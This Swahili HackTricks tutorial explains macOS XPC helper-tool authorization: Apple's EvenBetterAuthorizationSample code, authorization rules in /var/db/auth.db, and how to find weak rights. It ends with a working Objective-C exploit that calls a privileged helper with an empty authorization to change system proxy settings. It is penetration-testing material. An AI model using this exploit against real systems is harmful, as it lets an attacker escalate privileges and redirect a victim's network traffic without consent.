# Uthibitisho wa XPC kwenye macOS

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Uthibitisho wa XPC

Apple pia inapendekeza njia nyingine ya kuthibitisha ikiwa mchakato unaounganisha una **ruhusa ya kuita njia ya XPC iliyofichuliwa**.

Wakati programu inahitaji **kutekeleza vitendo kama mtumiaji aliye na ruhusa**, badala ya kuendesha programu kama mtumiaji aliye na ruhusa kawaida inaunda kama mtumiaji wa mizizi HelperTool kama huduma ya XPC ambayo inaweza kuitwa na programu kutekeleza vitendo hivyo. Walakini, programu inayoiita huduma hiyo inapaswa kuwa na idhini ya kutosha.

### ShouldAcceptNewConnection daima YES

Mfano unaweza kupatikana katika [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Katika `App/AppDelegate.m` inajaribu **kuunganisha** na **HelperTool**. Na katika `HelperTool/HelperTool.m` kazi ya **`shouldAcceptNewConnection`** **haitathibitisha** mahitaji yoyote yaliyotajwa hapo awali. Itarudi daima YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Kwa habari zaidi kuhusu jinsi ya configure hii check ipasavyo:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Haki za Maombi

Hata hivyo, kuna **idhini inayofanyika wakati njia kutoka HelperTool inaitwa**.

Kazi ya **`applicationDidFinishLaunching`** kutoka `App/AppDelegate.m` itaunda kumbukumbu tupu ya idhini baada ya programu kuanza. Hii daima inapaswa kufanya kazi.\
Kisha, itajaribu **kuongeza baadhi ya haki** kwenye kumbukumbu hiyo ya idhini kwa kuita `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funguo `setupAuthorizationRights` kutoka `Common/Common.m` itahifadhi katika database ya idhini `/var/db/auth.db` haki za programu. Tafadhali kumbuka jinsi itakavyoongeza haki ambazo bado hazipo katika database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funguo `enumerateRightsUsingBlock` ndiyo hutumika kupata ruhusa za programu, ambazo zinadefiniwa katika `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Hii inamaanisha kwamba mwishoni mwa mchakato huu, ruhusa zilizotangazwa ndani ya `commandInfo` zitahifadhiwa katika `/var/db/auth.db`. Tafadhali angalia jinsi unavyoweza kupata kwa **kila njia** itakayohitaji **uthibitisho**, **jina la ruhusa** na **`kCommandKeyAuthRightDefault`**. Ile ya mwisho **inaonyesha ni nani anaweza kupata haki hii**.

Kuna mizunguko tofauti ya kuonyesha ni nani anaweza kupata haki. Baadhi yao yamefafanuliwa katika [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) (unaweza kupata [zote hapa](https://www.dssw.co.uk/reference/authorization-rights/)), lakini kwa muhtasari:

<table><thead><tr><th width="284.3333333333333">Jina</th><th width="165">Thamani</th><th>Maelezo</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>ruhusu</td><td>Mtu yeyote</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>kataa</td><td>Hakuna mtu</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>ni-admin</td><td>Mtumiaji wa sasa lazima awe msimamizi (ndani ya kikundi cha wasimamizi)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>uthibitishe-mmiliki-wa-kikao</td><td>Uliza mtumiaji athibitishe.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>uthibitishe-msimamizi</td><td>Uliza mtumiaji athibitishe. Lazima awe msimamizi (ndani ya kikundi cha wasimamizi)</td></tr><tr><td>kAuthorizationRightRule</td><td>kanuni</td><td>Bayana sheria</td></tr><tr><td>kAuthorizationComment</td><td>maoni</td><td>Bayana maoni ya ziada kuhusu haki</td></tr></tbody></table>

### Uthibitisho wa Haki

Katika `HelperTool/HelperTool.m` kazi ya **`readLicenseKeyAuthorization`** inachunguza ikiwa mpigaji simu ameidhinishwa kutekeleza **njia hiyo** kwa kuita kazi ya **`checkAuthorization`**. Kazi hii itachunguza ikiwa **authData** iliyotumwa na mchakato unayopiga simu ina **muundo sahihi** na kisha itachunguza **nini kinahitajika kupata haki** ya kuita njia maalum. Ikiwa mambo yote yanaenda vizuri, **kosa lililorudishwa litakuwa `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Tafadhali elewa kwamba **kuchunguza mahitaji ya kupata haki** ya kuita hiyo njia, kazi `authorizationRightForCommand` itaangalia tu kipengele kilichotangazwa hapo awali **`commandInfo`**. Kisha, itaita **`AuthorizationCopyRights`** kuangalia **ikiwa ina haki** ya kuita hiyo njia (tambua kuwa bendera huruhusu mwingiliano na mtumiaji).

Katika kesi hii, ili kuita hiyo njia `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` imedhamiriwa kuwa `@kAuthorizationRuleClassAllow`. Hivyo **yeyote anaweza kuita**.

### Taarifa za DB

Ilitajwa kuwa taarifa hii imehifadhiwa katika `/var/db/auth.db`. Unaweza kuorodhesha sheria zote zilizohifadhiwa kwa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Kisha, unaweza kusoma ni nani anaweza kupata ufikiaji kwa haki na:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Haki za kibali

Unaweza kupata **mipangilio yote ya ruhusa** [**hapa**](https://www.dssw.co.uk/reference/authorization-rights/), lakini mchanganyiko ambao hautahitaji ushirikiano wa mtumiaji ni:

1. **'authenticate-user': 'false'**
* Hii ni funguo moja moja zaidi. Ikiwekwa kama `false`, inabainisha kwamba mtumiaji hahitaji kutoa uthibitisho kupata haki hii.
* Hutumiwa katika **mchanganyiko na moja ya 2 hapa chini au kuonyesha kikundi** ambacho mtumiaji lazima awe mwanachama.
2. **'allow-root': 'true'**
* Ikiwa mtumiaji anafanya kazi kama mtumiaji wa mizizi (ambaye ana ruhusa zilizoinuliwa), na funguo hii imewekwa kama `true`, mtumiaji wa mizizi anaweza kupata haki hii bila uthibitisho zaidi. Walakini, kwa kawaida, kufikia hadhi ya mtumiaji wa mizizi tayari kunahitaji uthibitisho, kwa hivyo hii siyo hali ya "bila uthibitisho" kwa watumiaji wengi.
3. **'session-owner': 'true'**
* Ikiwekwa kama `true`, mmiliki wa kikao (mtumiaji aliyeingia kwenye mfumo) atapata haki hii moja kwa moja. Hii inaweza kupuuza uthibitisho wa ziada ikiwa mtumiaji tayari ameingia kwenye mfumo.
4. **'shared': 'true'**
* Funguo hii haipati haki bila uthibitisho. Badala yake, ikiwekwa kama `true`, inamaanisha kwamba mara haki imeidhinishwa, inaweza kugawanywa kati ya michakato mingi bila kila moja kuhitaji kuthibitisha tena. Lakini kuidhinishwa kwa awali kwa haki hiyo bado itahitaji uthibitisho isipokuwa imechanganywa na funguo zingine kama `'authenticate-user': 'false'`.

Unaweza [**kutumia skripti hii**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kupata haki za kuvutia:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Kugeuza Idhini

### Kuangalia ikiwa EvenBetterAuthorization inatumika

Ikiwa utapata kazi: **`[HelperTool checkAuthorization:command:]`** labda mchakato unatumia mfumo uliotajwa hapo awali kwa idhini:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Kwa hivyo, ikiwa kazi hii inaita kazi kama `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, inatumia [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Angalia **`/var/db/auth.db`** kuona ikiwa ni rahisi kupata ruhusa ya kuita hatua fulani ya kipekee bila ushirikiano wa mtumiaji.

### Mawasiliano ya Itifaki

Kisha, unahitaji kupata mfumo wa itifaki ili uweze kuanzisha mawasiliano na huduma ya XPC.

Kazi **`shouldAcceptNewConnection`** inaonyesha mfumo wa itifaki unaozalishwa:

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Katika kesi hii, tuna kitu sawa na EvenBetterAuthorizationSample, [**angalia mstari huu**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kwa kujua, jina la itifaki iliyotumiwa, ni rahisi **kudondosha ufafanuzi wake wa kichwa** na:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Mwisho, tunahitaji kujua **jina la Huduma ya Mach iliyofichuliwa** ili kuanzisha mawasiliano nayo. Kuna njia kadhaa za kupata hii:

* Katika **`[HelperTool init]`** ambapo unaweza kuona Huduma ya Mach inayotumiwa:

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Katika faili ya uzinduzi ya launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Mfano wa Kutumia

Katika mfano huu imeundwa:

* Ufafanuzi wa itifaki na kazi zake
* Kitambulisho tupu cha uthibitishaji kutumika kuomba ufikiaji
* Uunganisho kwa huduma ya XPC
* Wito kwa kazi endapo uunganisho ulifanikiwa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Marejeo

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
